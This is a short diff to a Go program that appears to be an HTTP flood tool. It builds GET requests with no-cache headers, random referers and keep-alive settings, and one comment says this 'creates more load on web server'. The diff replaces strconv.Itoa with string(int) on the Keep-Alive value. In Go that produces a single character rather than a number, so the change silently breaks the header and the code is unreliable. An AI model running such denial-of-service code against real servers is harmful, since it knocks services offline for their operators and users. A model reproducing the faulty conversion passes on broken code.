@@ -7,7 +7,6 @@ import (
 	"net/http"
 	"os"
 	"os/signal"
-	"strconv"
 	"strings"
 	"sync/atomic"
 	"syscall"
@@ -62,7 +61,7 @@ func get() {
 	req.Header.Add("Pragma", "no-cache")                                                     // used in case https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Pragma
 	req.Header.Add("Cache-Control", "no-store, no-cache")                                    // creates more load on web server
 	req.Header.Set("Referer", referers[rand.Intn(len(referers))]+buildblock(rand.Intn(5)+5)) // uses random referer from list
-	req.Header.Set("Keep-Alive", strconv.Itoa(rand.Intn(10)+100))
+	req.Header.Set("Keep-Alive", string(rand.Intn(10)+100))
 	req.Header.Set("Connection", "keep-alive")
 
 	resp, err := c.Do(req)
